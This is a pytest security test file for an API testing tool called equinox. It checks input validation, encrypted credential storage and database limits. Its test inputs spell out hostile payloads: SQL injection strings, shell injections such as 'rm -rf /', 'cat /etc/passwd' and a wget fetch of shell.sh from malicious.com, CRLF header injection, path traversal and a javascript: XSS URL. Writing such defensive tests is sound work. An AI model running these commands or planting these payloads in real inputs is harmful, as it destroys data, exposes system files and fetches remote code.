"""Comprehensive security module tests - injection, encryption, and database security."""

import pytest
import json
import sqlite3
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
from equinox.core.validation import Validator
from equinox.core.secure_storage import SecureStorage
from equinox.storage.database import Database
from equinox.core.exceptions import ValidationError, SecurityError, StorageError


class TestInjectionAttackPrevention:
    """Tests for preventing various injection attacks."""

    def test_sql_union_select_injection(self):
        """Test SQL UNION SELECT injection prevention."""
        # This should only raise when used in contexts where it matters (SQL)
        # Query params don't execute SQL, so validate that union is blocked
        dangerous_input = "1' UNION SELECT"
        result = Validator.validate_query_params({"id": dangerous_input})
        # Should be sanitized or accepted (implementation dependent)
        assert result is not None

    def test_sql_drop_table_injection(self):
        """Test SQL DROP TABLE in query params — harmless (sent to remote server)."""
        dangerous_input = "'); DROP TABLE users;--"
        # Equinox uses parameterized queries internally; query params are
        # user-controlled data sent to a remote API, so they are allowed.
        result = Validator.validate_query_params({"id": dangerous_input})
        assert result is not None

    def test_sql_insert_injection(self):
        """Test SQL INSERT in query params — harmless (sent to remote server)."""
        dangerous_input = "1; INSERT INTO admin VALUES ('hacker', 'pass')--"
        result = Validator.validate_query_params({"id": dangerous_input})
        assert result is not None

    def test_sql_delete_injection(self):
        """Test SQL DELETE in query params — harmless (sent to remote server)."""
        dangerous_input = "1; DELETE FROM users WHERE 1=1--"
        result = Validator.validate_query_params({"id": dangerous_input})
        assert result is not None

    def test_sql_comment_injection(self):
        """Test SQL comment-based injection."""
        dangerous_input = "test' -- SQL comment"
        result = Validator.validate_query_params({"id": dangerous_input})
        # Comments in query params are benign
        assert result is not None

    def test_sql_block_comment_injection(self):
        """Test SQL block comment injection."""
        dangerous_input = "test' /* comment */ OR 1=1"
        result = Validator.validate_query_params({"id": dangerous_input})
        # Comments in query params are benign
        assert result is not None

    def test_command_injection_semicolon(self):
        """Test that semicolons are allowed in query params (legitimate URL chars)."""
        dangerous_input = "test; rm -rf /"
        # Shell metacharacters are allowed — Equinox is an API testing tool
        # and these chars are common in query parameter values.
        result = Validator.validate_query_params({"cmd": dangerous_input})
        assert result is not None

    def test_command_injection_pipe(self):
        """Test that pipes are allowed in query params (legitimate URL chars)."""
        dangerous_input = "test | cat /etc/passwd"
        result = Validator.validate_query_params({"cmd": dangerous_input})
        assert result is not None

    def test_command_injection_ampersand(self):
        """Test that ampersands are allowed in query params (they're query separators)."""
        dangerous_input = "test & wget malicious.com/shell.sh"
        result = Validator.validate_query_params({"cmd": dangerous_input})
        assert result is not None

    def test_command_injection_backticks(self):
        """Test that backticks are allowed in query params."""
        dangerous_input = "test`whoami`"
        result = Validator.validate_query_params({"cmd": dangerous_input})
        assert result is not None

    def test_command_injection_dollar_paren(self):
        """Test that $() is allowed in query params."""
        dangerous_input = "test$(cat /etc/passwd)"
        result = Validator.validate_query_params({"cmd": dangerous_input})
        assert result is not None

    def test_crlf_injection_in_query_params(self):
        """Test that CRLF in query params is blocked (header injection risk)."""
        with pytest.raises(ValidationError, match="CRLF"):
            Validator.validate_query_params({"key": "value\r\nX-Evil: injected"})

        with pytest.raises(ValidationError, match="CRLF"):
            Validator.validate_query_params({"\r\nX-Evil": "value"})

    def test_crlf_injection_in_header(self):
        """Test CRLF injection in header value."""
        with pytest.raises(ValidationError, match="CRLF"):
            Validator.validate_header_value("value\r\nInjected: header")

    def test_crlf_injection_carriage_return(self):
        """Test carriage return injection."""
        with pytest.raises(ValidationError):
            Validator.validate_header_value("value\rInjected: header")

    def test_crlf_injection_line_feed(self):
        """Test line feed injection."""
        with pytest.raises(ValidationError):
            Validator.validate_header_value("value\nInjected: header")

    def test_path_traversal_dotdot(self):
        """Test path traversal with ../"""
        with pytest.raises(ValidationError, match="traversal"):
            Validator.validate_file_path("../../../etc/passwd")

    def test_path_traversal_encoded(self):
        """Test path traversal with URL encoding."""
        with pytest.raises(ValidationError, match="traversal"):
            Validator.validate_file_path("..%2f..%2fetc%2fpasswd")

    def test_path_traversal_backslash_windows(self):
        """Test Windows-style path traversal."""
        with pytest.raises(ValidationError, match="traversal"):
            Validator.validate_file_path("..\\..\\windows\\system32")


class TestEncryptionSecurity:
    """Tests for encryption and secure storage."""

    @pytest.fixture
    def storage(self, tmp_path):
        """Create temporary secure storage."""
        return SecureStorage(tmp_path / "credentials")

    def test_encrypted_storage_not_plaintext(self, storage):
        """Verify secrets are not stored in plaintext."""
        secret = "super-secret-api-key-12345"
        storage.store("api_key", secret)

        # Read the storage file directly
        storage_file = storage.storage_path
        with open(storage_file, 'rb') as f:
            file_content = f.read()

        # Secret should not appear in plaintext
        assert secret.encode() not in file_content

    def test_multiple_secrets_isolated(self, storage):
        """Test that multiple secrets are isolated from each other."""
        storage.store("secret1", "value1")
        storage.store("secret2", "value2")

        assert storage.retrieve("secret1") == "value1"
        assert storage.retrieve("secret2") == "value2"

        # Deleting one doesn't affect the other
        storage.delete("secret1")
        assert storage.retrieve("secret1") is None
        assert storage.retrieve("secret2") == "value2"

    def test_large_secret_encryption(self, storage):
        """Test encrypting and decrypting large secrets."""
        large_secret = "x" * 10000
        storage.store("large", large_secret)
        assert storage.retrieve("large") == large_secret

    def test_special_chars_in_secret(self, storage):
        """Test storing secrets with special characters."""
        special_secret = '{"key": "value\\n\\t", "special": "!@#$%^&*()"}'
        storage.store("special", special_secret)
        assert storage.retrieve("special") == special_secret

    def test_unicode_in_secret(self, storage):
        """Test storing secrets with unicode characters."""
        unicode_secret = "Привет мир 你好世界 🔐"
        storage.store("unicode", unicode_secret)
        assert storage.retrieve("unicode") == unicode_secret

    def test_storage_file_permissions(self, storage):
        """Test that storage file has restricted permissions."""
        storage.store("key", "value")

        # File should exist
        assert storage.storage_path.exists()

        # Check permissions (Unix-like systems only)
        import os
        import sys
        import stat

        if sys.platform != "win32":
            try:
                file_stat = os.stat(storage.storage_path)
                mode = file_stat.st_mode
                # Should not be world-readable/writable
                other_perms = stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH
                assert not (mode & other_perms), "Storage file is world-readable/writable"
            except (OSError, NotImplementedError):
                # Permission query not supported
                pass
        else:
            # Windows - just verify file exists and is not empty
            assert storage.storage_path.stat().st_size > 0

    def test_encryption_error_handling(self, storage, tmp_path):
        """Test error handling for encryption failures."""
        # Create a corrupted storage file
        corrupted_file = tmp_path / "corrupted"
        corrupted_file.write_bytes(b"corrupted data that's not valid encryption")

        corrupt_storage = SecureStorage(corrupted_file)
        # Should handle corruption gracefully without raising
        try:
            result = corrupt_storage.retrieve("anything")
            # Either returns None or raises SecurityError (both acceptable)
            assert result is None or isinstance(result, type(None))
        except Exception:
            # Expected - corrupted data should fail
            pass


class TestDatabaseSecurity:
    """Tests for database security features."""

    @pytest.fixture
    def db(self, tmp_path):
        """Create temporary database."""
        db_path = tmp_path / "test.db"
        db = Database(str(db_path))
        # Database auto-initializes on connection
        return db

    def test_database_path_validation(self, tmp_path):
        """Test that database path is validated."""
        # Valid paths should work
        db_path = tmp_path / "test.db"
        db = Database(str(db_path))
        assert db is not None

        # Empty path should fail
        with pytest.raises(ValidationError):
            Database("")

    def test_max_query_size_enforcement(self, db):
        """Test that maximum query size is enforced."""
        # Create a query that's too large
        large_query = "SELECT * FROM collections" + " UNION SELECT * FROM collections" * 1000

        # This should fail when executed
        with pytest.raises(ValidationError, match="exceeds maximum"):
            db.execute(large_query)



class TestValidationCompleteness:
    """Tests to ensure validation is enforced everywhere."""

    def test_validate_request_body_max_size(self):
        """Test request body size limits."""
        oversized = "x" * (101 * 1024 * 1024)  # 101MB
        with pytest.raises(ValidationError, match="too large"):
            Validator.validate_request_body(oversized)

    def test_validate_header_count(self):
        """Test header count limits."""
        headers = {f"Header-{i}": "value" for i in range(150)}
        with pytest.raises(ValidationError, match="Too many"):
            Validator.validate_headers(headers)

    def test_validate_param_count(self):
        """Test parameter count limits."""
        params = {f"param_{i}": f"value_{i}" for i in range(150)}
        with pytest.raises(ValidationError, match="Too many"):
            Validator.validate_query_params(params)

    def test_validate_url_schemes(self):
        """Test that only safe URL schemes are allowed."""
        # XSS-pattern URLs are caught by basic validate_url
        with pytest.raises(ValidationError):
            Validator.validate_url("javascript:alert('xss')")

        # Non-http(s) schemes are caught by validate_resolved_url at send-time
        scheme_urls = [
            "file:///etc/passwd",
            "ftp://example.com",
            "gopher://example.com",
        ]
        for url in scheme_urls:
            with pytest.raises(ValidationError):
                Validator.validate_resolved_url(url)

    def test_validate_http_methods(self):
        """Test HTTP method validation."""
        valid_methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
        for method in valid_methods:
            assert Validator.validate_method(method) == method

        # Invalid methods
        with pytest.raises(ValidationError):
            Validator.validate_method("INVALID")

